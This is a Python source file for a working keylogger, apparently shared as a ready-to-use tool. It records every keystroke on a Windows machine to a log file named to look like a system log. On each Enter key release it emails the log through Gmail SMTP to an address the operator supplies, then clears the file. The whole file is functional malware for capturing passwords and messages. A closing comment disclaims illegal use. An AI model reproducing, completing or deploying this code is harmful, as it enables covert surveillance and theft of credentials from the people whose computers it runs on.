from tkinter import W
import os
from pynput import keyboard
from pynput.keyboard import Key
import logging  
import smtplib
from email.message import EmailMessage

msg = EmailMessage()

FORMAT = "%(levelname)s %(asctime)s %(message)s"

os.chdir('c:/')

path = os.getcwd()

try:
    os.mkdir(f'{path}/temp')
except:
    pass

logging.basicConfig(filename=(f'{path}/temp/sys.log'), level=logging.DEBUG, format=FORMAT, filemode=W)

som = ''           # ------>>> set your mail_id inside the colon   (_you are going to get the file from this keylogger_)(enable less secure app password)
somosis = ''       # ------>>> set your mail_id password inside the colon  (_you are going to get the file from this keylogger_)(use the less secure app password)

mail_id = ''       # ------->>> set your mail_id here inside the colon for recieving the keylogger file

msg['subject'] = 'keylogger'
msg['from'] = 'sasimon'
msg['To'] = mail_id
msg.set_content('automated mail from keylogger')

def onPress(key):
    logging.info(key)

def onRelease(key):
    if key == Key.enter:
        try:
            with open(f'{path}/temp/sys.log', 'r') as f:
                fileData = f.read()
                fileName = f.name
            msg.add_attachment(fileData, filename= fileName)

        except Exception:
            print('file not found !!!')

        else:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(som,somosis)
                smtp.send_message(msg)
                smtp.close()
        finally:
            with open(f'{path}/temp/sys.log', 'w') as wr:
                wr.write('%temp% ')


with keyboard.Listener(
    on_press=onPress,
    on_release=onRelease
)   as keyboard_listener:
        keyboard_listener.join()



        #                                               --> dont use this software for illegal purpose !! <--
        #                                           {"read the README file for a complete guide to use this Tool"}
